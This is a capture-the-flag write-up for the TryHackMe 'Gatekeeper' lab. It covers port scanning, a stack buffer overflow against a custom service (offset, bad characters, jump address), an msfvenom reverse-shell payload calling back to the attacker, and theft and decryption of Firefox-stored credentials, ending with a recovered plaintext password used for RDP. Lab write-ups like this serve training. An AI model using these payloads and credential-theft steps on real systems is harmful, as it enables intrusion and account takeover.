Gatekeeper
===
###### tags: `THM` `Medium`
###### Link: https://tryhackme.com/room/gatekeeper

# Recon

## Nmap
```bash
$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $ip
```
```
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
31337/tcp open  Elite         syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49161/tcp open  unknown       syn-ack ttl 127
49165/tcp open  unknown       syn-ack ttl 127
```

### OS
TTL --> WIN

### Detect services
```bash
$ nmap -sCV -p 135,139,445,3389,31337,49152,49153,49154,49161,49165 $ip
```
```
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-01T11:15:50-04:00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:f3:78:8b:7e:ad (unknown)
| smb2-time:
|   date: 2022-04-01T15:15:50
|_  start_date: 2022-04-01T15:08:07
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 47m59s, deviation: 1h47m19s, median: 0s
```

### Well-known vulnerabilities
```bash
$ nmap -Pn -sV -v --script vuln -p 135,139,445,3389,31337 $ip
```
```
3389/tcp  open  ssl/ms-wbt-server?
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
```

### SMB enum
```bash
$ nmap -Pn -v --script=smb-enum-shares -p 445 $ip
```
```
Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.131.92\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.131.92\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.131.92\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.131.92\Users:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ
```

## Sumary
* SO: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
* Relevant ports: 135,139,445,3389,31337
* 3389: vulnerable to RCE (MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability)
* Path shared with read access: \\10.10.131.92\Users
* 31337: Service that support an input (Vulnerable to BOF?)

![225b9767c015c5dc2281f6b27837c73f.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/225b9767c015c5dc2281f6b27837c73f.png)

# Explotation
Let's see the smb share `/Users`

![3513999b163e6713dc95990cfbb31dd8.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/3513999b163e6713dc95990cfbb31dd8.png)

What does that binary do? After testing it in a WIN test machine, it seems the same program that the one is running on the target machine in the port 31337. So next step is test it for BOF with Immunity Debugger, mona and manual tools with python:

```
$ python3 bin/fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing crashed at 200 bytes
```

![2b67c5d2fef74c299d7895f64a8af9f8.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/2b67c5d2fef74c299d7895f64a8af9f8.png)

Now, we need to stabilize that BOF. After create a payload of 200 bytes and execute out manual exploit:

EIP Offset: `EIP contains normal pattern : 0x39654138 (offset 146)`

We are able to write in memory. What characters we are not abe to use?

![19b1daa54f8332fab4a4f4a7becfe1a4.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/19b1daa54f8332fab4a4f4a7becfe1a4.png)

\x00\x0a

And were are the jump funcions to execute code?

![ec623ef17e986058ca4c20d52c2a4126.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/ec623ef17e986058ca4c20d52c2a4126.png)

\xc3\x14\x04\x08

## Spawn a shell
Let's generate a reverse shell payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=$l_ip LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c > payload/shell
```

Adding to the BOF exploit, we have a shell in our lab:

![7311b02635c4b055dcbc25a70f8a83e5.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/7311b02635c4b055dcbc25a70f8a83e5.png)

# Post-explotation

## Spawn a shell - User flag
Let's test the room:

![da76808c6fbdcc7a443f33a0b021eb87.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/da76808c6fbdcc7a443f33a0b021eb87.png)

It works!

## Privilege escalation - root flag
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
```
systeminfo
```
```
Host Name:                 GATEKEEPER
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
```

```
net user
```
```
Administrator
Guest
mayor
natbat
```

```
whoami /priv
```
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

```
net localgroup
```
```
Aliases for \\GATEKEEPER

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*HomeUsers
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.
```

```
net localgroup Administrators
```
```
Members
---------
Administrator
mayor
```

Installed programs:
```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
```

* DVD Maker
* Mozilla Firefox

```
schtasks /query /fo LIST 2>nul | findstr TaskName
```
```
TaskName:      \Mozilla\Firefox Default Browser Agent 4B4832DCE3D0EB51
```

```
netstat -ano
```
```
  UDP    10.10.176.170:137      *:*       4
  UDP    10.10.176.170:138      *:*       4
  UDP    10.10.176.170:1900     *:*       1252
  UDP    10.10.176.170:64270    *:*       1252
  UDP    127.0.0.1:1900         *:*       1252
  UDP    127.0.0.1:64271        *:*       1252
```

```
netsh firewall show config
```
```
Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------
Enable   Inbound              dostackbufferoverflowgood.exe / C:\users\mayor\desktop\dostackbufferoverflowgood.exe
```

Another BOF? C:\users\mayor\desktop\dostackbufferoverflowgood.exe

I cannot access to mayor home.

```
tasklist /NH | sort
```
```
amazon-ssm-agent.exe          1788 Services                   0      7,980 K
cmd.exe                       1300 Console                    1      3,656 K
cmd.exe                       1548 Console                    1      2,680 K
cmd.exe                       2400 Console                    1      3,648 K
conhost.exe                   1580 Console                    1      4,040 K
conhost.exe                   1640 Services                   0      2,184 K
conhost.exe                   1648 Console                    1      4,228 K
conhost.exe                   1724 Services                   0      2,292 K
csrss.exe                      560 Services                   0      3,664 K
csrss.exe                      604 Console                    1      3,964 K
Defrag.exe                    2676 Services                   0      4,212 K
dinotify.exe                  2780 Console                    1      4,256 K
dwm.exe                       1328 Console                    1      3,964 K
explorer.exe                  1348 Console                    1     25,740 K
findstr.exe                    832 Console                    1      3,448 K
gatekeeper.exe                1632 Console                    1      3,828 K
LiteAgent.exe                 1948 Services                   0      3,536 K
lsass.exe                      676 Services                   0      7,628 K
lsm.exe                        684 Services                   0      4,808 K
MpCmdRun.exe                  2320 Services                   0      1,140 K
rundll32.exe                  1132 Services                   0      4,420 K
rundll32.exe                  2732 Console                    1      9,424 K
SearchIndexer.exe             2072 Services                   0     13,256 K
services.exe                   644 Services                   0      6,820 K
slui.exe                      2612 Console                    1      9,024 K
smss.exe                       432 Services                   0        892 K
sort.exe                      1160 Console                    1      2,416 K
spoolsv.exe                   1392 Services                   0      6,784 K
sppsvc.exe                    1704 Services                   0      7,668 K
svchost.exe                    468 Services                   0     60,980 K
svchost.exe                    476 Services                   0     29,380 K
svchost.exe                    812 Services                   0      7,576 K
svchost.exe                    904 Services                   0      6,392 K
svchost.exe                    948 Services                   0     13,480 K
svchost.exe                   1060 Services                   0     11,280 K
svchost.exe                   1200 Services                   0     23,020 K
svchost.exe                   1252 Services                   0      4,452 K
svchost.exe                   1456 Services                   0      9,644 K
svchost.exe                   2176 Services                   0     35,336 K
svchost.exe                   2268 Services                   0      4,496 K
svchost.exe                   3012 Services                   0      6,540 K
System                           4 Services                   0      2,848 K
System Idle Process              0 Services                   0         24 K
taskhost.exe                  1524 Console                    1      5,764 K
tasklist.exe                  2336 Console                    1      5,484 K
vm3dservice.exe               1508 Console                    1      3,144 K
wininit.exe                    596 Services                   0      3,628 K
winlogon.exe                   692 Console                    1      5,064 K
WmiPrvSE.exe                  2796 Services                   0      6,252 K
wmpnetwk.exe                  1356 Services                   0      2,572 K
```

Firefox is installed and the current user seems used it, there are data in the local AppData:

![993110a4059958dab56f8ce0841ce656.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/993110a4059958dab56f8ce0841ce656.png)

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>more logins.json
```
```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://creds.com",
      "httpRealm": null,
      "formSubmitURL": "",
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==",
      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=",
      "guid": "{7ccdc063-ebe9-47ed-8989-0133460b4941}",
      "encType": 1,
      "timeCreated": 1587502931710,
      "timeLastUsed": 1587502931710,
      "timePasswordChanged": 1589510625802,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

Lets copy the entire profile to the public share:
```
xcopy /S /I /E C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release C:\Users\Share\firefox
```

Download it:

![5b757520c9b8f458c3020869d7e4e1d1.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/5b757520c9b8f458c3020869d7e4e1d1.png)

And decrypt the creds with https://github.com/unode/firefox_decrypt:

![2876d918fb1654b27d6a33150bebaeca.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/2876d918fb1654b27d6a33150bebaeca.png)

Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

Using this creds to log in with RDP:

![93000f140fbd30678d574650816c4667.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/93000f140fbd30678d574650816c4667.png)
